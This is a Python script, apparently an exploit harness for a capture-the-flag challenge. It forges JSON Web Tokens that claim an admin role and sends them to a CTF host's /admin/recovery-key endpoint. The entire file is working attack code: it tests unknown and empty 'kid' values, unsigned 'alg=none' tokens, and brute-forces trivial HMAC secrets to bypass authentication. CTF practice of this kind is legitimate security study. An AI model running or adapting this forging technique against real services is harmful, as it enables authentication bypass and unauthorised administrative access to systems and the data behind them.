#!/usr/bin/env python3
"""JWT forge harness for the Vardanne console (kid-driven HS256 key selection)."""
import base64, hashlib, hmac, json, sys, urllib.request, urllib.error

BASE = "http://w02.ctf.chronos-security.ro:33768"
UA = "vardanne-analyst/1.0"


def b64(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def make(payload: dict, key: bytes, kid: str = "session", alg: str = "HS256") -> str:
    header = {"alg": alg, "typ": "JWT", "kid": kid}
    signing_input = "%s.%s" % (b64(json.dumps(header, separators=(",", ":")).encode()),
                               b64(json.dumps(payload, separators=(",", ":")).encode()))
    if alg == "none":
        return signing_input + "."
    sig = hmac.new(key, signing_input.encode(), hashlib.sha256).digest()
    return signing_input + "." + b64(sig)


def get(path: str, token: str | None):
    req = urllib.request.Request(BASE + path, headers={"User-Agent": UA})
    if token:
        req.add_header("Authorization", "Bearer " + token)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def probe(label: str, token: str, path: str = "/admin/recovery-key"):
    code, body = get(path, token)
    print("%-58s %s %s" % (label, code, body[:160].replace("\n", " ")))
    return code, body


if __name__ == "__main__":
    admin = {"sub": "analyst-recon-17", "role": "admin"}
    print("=== unknown kid behaviour ===")
    probe("kid=nonexistent key=b'session'", make(admin, b"session", kid="nonexistent"))
    probe("kid=empty key=b'session'", make(admin, b"session", kid=""))
    print("=== alg none ===")
    probe("alg=none no sig", make(admin, b"", kid="session", alg="none"))
    print("=== key = kid string / trivial secrets ===")
    for k in (b"session", b"", b"secret", b"admin", b"vardanne", b"password"):
        probe("kid=session key=%r" % k, make(admin, k, kid="session"))
